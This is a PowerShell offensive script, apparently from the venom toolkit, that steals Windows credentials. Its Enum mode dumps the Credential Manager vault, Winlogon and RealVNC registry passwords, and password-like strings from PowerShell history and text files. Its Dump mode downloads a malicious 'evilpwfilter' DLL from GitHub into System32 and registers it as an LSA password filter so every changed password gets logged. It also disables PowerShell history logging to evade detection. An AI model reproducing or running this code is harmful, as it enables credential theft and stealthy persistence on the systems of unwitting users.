<#
.SYNOPSIS
   Author: @mubix|@r00t-3xp10it
   Helper - Stealing passwords every time they change {mitre T1174}
   Helper - Search for creds in diferent locations {store|regedit|disk}

.DESCRIPTION
   -GetPasswords [ Enum ] searchs creds in store\regedit\disk diferent locations.
   -GetPasswords [ Dump ] Explores a native OS notification of when the user
   account password gets changed which is responsible for validating it.
   That means that the user password can be intercepted and logged.

.NOTES
   -GetPasswords [ Dump ] requires Administrator privileges to add reg keys
   To stop this exploit its required the manual deletion of '0evilpwfilter.dll'
   from 'C:\Windows\System32' and the reset of 'HKLM:\..\Control\lsa' registry key.
   REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f

.EXAMPLE
   PS C:\> Get-Help .\GetPasswords.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\GetPasswords.ps1 -GetPasswords Enum
   Search for creds in store\regedit\disk {txt\xml\logs} diferent locations

.EXAMPLE
   PS C:\> .\GetPasswords.ps1 -GetPasswords Enum -StartDir `$Env:USERPROFILE
   Search recursive for creds in store\regedit\disk {txt\xml\logs} starting in -StartDir directory

.EXAMPLE
   PS C:\> .\GetPasswords.ps1 -GetPasswords Dump
   Intercepts user changed passwords {logon} by: @mubix

.OUTPUTS
   Time     Status  ReportFile           VulnDLLPath
   ----     ------  ----------           -----------
   17:49:23 active  C:\Temp\logFile.txt  C:\Windows\System32\0evilpwfilter.dll
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$StartDir="$Env:USERPROFILE",
   [string]$GetPasswords="false"
)


Write-Host ""
If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null

    ## Local function variable declarations
    $VulnDll = "$Env:WINDIR\" + "System32\0evilpwfilter." + "dll" -Join ''
    $DllStatus = "not active"

    ## Sellecting module Scan mode
    If($GetPasswords -ieq "Enum"){

        Write-Host "Scanning credential store for creds!" -ForegroundColor Green
        Start-Sleep -Seconds 1
        ## Dump local passwords from credential manager
        [void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType = WindowsRuntime]
        $vault = New-Object Windows.Security.Credentials.PasswordVault
        $allpass = $vault.RetrieveAll() | % { 
            $_.RetrievePassword(); $_ 
        }|Select Resource, UserName, Password|Sort-Object Resource|ft -AutoSize
        If($allpass -ieq $null){## Error => none credentials found under PasswordVault
            write-host "[error] none credentials found under PasswordVault!" -ForegroundColor Red -BackgroundColor Black
        }

        ## Checking Registry for winlogon credentials
        $RawKKLMKey = "HKLM:\SOFTWARE\Microsoft\" + "Windows NT\CurrentVersion\Winlogon" -Join ''
        $WinLogOnPass = (Get-Itemproperty -path "$RawKKLMKey" -EA SilentlyContinue).DefaulPassword
        $WinLogOnName = (Get-Itemproperty -path "$RawKKLMKey" -EA SilentlyContinue).LastUsedUsername
        $DefaultDName = (Get-Itemproperty -path "$RawKKLMKey" -EA SilentlyContinue).DefaultDomainName
        $RealVnc = $(Get-Itemproperty -path "HKLM:\SOFTWARE\RealVNC\WinVNC4" -EA SilentlyContinue).password

        ## Build Output Table
        Write-Host "`nScanning registry for winlogon creds!" -ForegroundColor Green
        Write-Host "-------------------------------------";Start-Sleep -Seconds 1
        Write-Host "Username    : $WinLogOnName"
        Write-Host "DomainName  : $DefaultDName"
        Write-Host "Password    : $WinLogOnPass"
        Write-Host "RealVNC Pass: $RealVnc"

        ## Checking ConsoleHost_History for credentials
        Write-Host "`nScanning ConsoleHost_History for creds!" -ForegroundColor Green;Start-Sleep -Seconds 1
        $PSHistory = "$Env:APPDATA\Microsoft\Windows\" + "PowerShell\PSReadLine\ConsoleHost_History.txt" -Join ''
        $Credentials = Get-Content -Path "$PSHistory"|
            Select-String -pattern "user:","pass:","username:","pwd:","passw:","passwd:","password:","login:","logon:"
        If(-not($Credentials) -or $Credentials -eq $null){## Make sure we have any creds returned
            Write-Host "[error] None Credentials found under ConsoleHost_History!" -ForegroundColor Red -BackgroundColor Black
        }Else{## Credentials found
            Write-Host "-------------------------------------"
            ForEach($token in $Credentials){# Loop in each string found
                Write-Host "$token"
            }
        }

        ## List Stored Passwords {in Text\Xml\Log Files}
        Write-Host "`nScanning txt\xml\log for stored creds!" -ForegroundColor Green
        If(-not(Test-Path -Path "$StartDir")){## User Input directory not found
            Write-Host "[error] -StartDir '$StartDir' not found!" -ForegroundColor Red -BackGroundColor Black
        }Else{## -StartDir User Input directory found

           ## Exclude from DataBase report { Folders } and Match only { txt|xml|log extensions }
           $dAtAbAsEList = Get-ChildItem -Path "$StartDir" -Recurse -EA SilentlyContinue -Force|Where-Object {
              $_.PSIsContainer -ieq $False -and $_.FullName -iMatch '.txt' -or $_.FullName -iMatch '.log' -or $_.FullName -iMatch '.xml'
           }|Select-Object -ExpandProperty FullName         
         
           ForEach($Item in $dAtAbAsEList){## Search in $dAtAbAsEList for login strings
              Get-Content -Path "$Item" -EA SilentlyContinue -Force|
              Select-String -Pattern "user:","pass:","username:","pwd:","passw:","passwd:","password:","login:","logon:" >> $Env:TMP\passwd.txt
           }

           $ChekCreds = Get-Content -Path "$Env:TMP\passwd.txt" -EA SilentlyContinue|
               Select-String -pattern "user:","pass:","username:","pwd:","passw:","passwd:","password:","login:","logon:"|
               findstr /V "S E R V I C E"|findstr /V "if self.username:"|findstr /V "#"|? {$_.trim() -ne ""}
           If($ChekCreds -ieq $null){## None credentials found
              Write-Host "[error] None credentials found under $StartDir!" -ForegroundColor Red -BackgroundColor Black
           }Else{## Credentials found
              Write-Host "-------------------------------------"
              ForEach($token in $ChekCreds){# Loop in each string found
                  Write-Host "$token"
              }
           }
           If(Test-Path -Path "$Env:TMP\passwd.txt"){Remove-Item -Path "$Env:TMP\passwd.txt" -Force}
        }
     
    }ElseIf($GetPasswords -ieq "Dump"){
        ## This function requires Admin privileges to add reg keys
        $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")

        If($IsClientAdmin){## Administrator privileges active
            $TestVuln = reg query "hklm\system\currentcontrolset\control\lsa" /v "notification packages"
            If($TestVuln){## Vulnerable registry key present

                ## Download 0evilpwfilter.dll from my GitHub repository
                If(-not(Test-Path -Path "$VulnDll")){## Check if auxiliary exists
                    Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/main/bin/0evilpwfilter.dll -Destination $Env:WINDIR\System32\0evilpwfilter.dll -ErrorAction SilentlyContinue|Out-Null
                }

                ## Make sure the downloaded DLL its not corrupted
                $CheckInt = Get-Content -Path "$VulnDll" -EA SilentlyContinue
                If(-not(Test-Path -Path "$VulnDll") -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
                    ## Fail to download 0evilpwfilter.dll using BitsTransfer OR the downloaded file is corrupted
                    Write-Host "[abort] fail to download 0evilpwfilter.dll using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
                    If(Test-Path -Path "$VulnDll"){Remove-Item -Path "$VulnDll" -Force}
                    Write-Host "";Start-Sleep -Seconds 1;exit ## exit @GetPasswords
                }

                ## Add Registry key to regedit
                reg add "hklm\system\currentcontrolset\control\lsa" /v "notification packages" /d scecli\0evilpwfilter /t reg_multi_sz /f
                $DllTimer = Get-Date -Format 'HH:mm:ss'
                $DllStatus = "active"
             }

             ## Create Data Table for output
             $mytable = new-object System.Data.DataTable
             $mytable.Columns.Add("Time") | Out-Null
             $mytable.Columns.Add("Status") | Out-Null
             $mytable.Columns.Add("ReportFile") | Out-Null
             $mytable.Columns.Add("VulnDLLPath") | Out-Null
             $mytable.Rows.Add("$DllTimer",
                               "$DllStatus",
                               "C:\Temp\logFile.txt",
                               "$VulnDll") | Out-Null

             ## Display Table
             $mytable|Format-Table -AutoSize
         }## Running Under UserLand Privileges
         Write-Host "[error] Administrator privileges required on shell!" -ForegroundColor Red -BackgroundColor Black
    }## Sellecting module Scan mode
    Write-Host "";Start-Sleep -Seconds 1
}
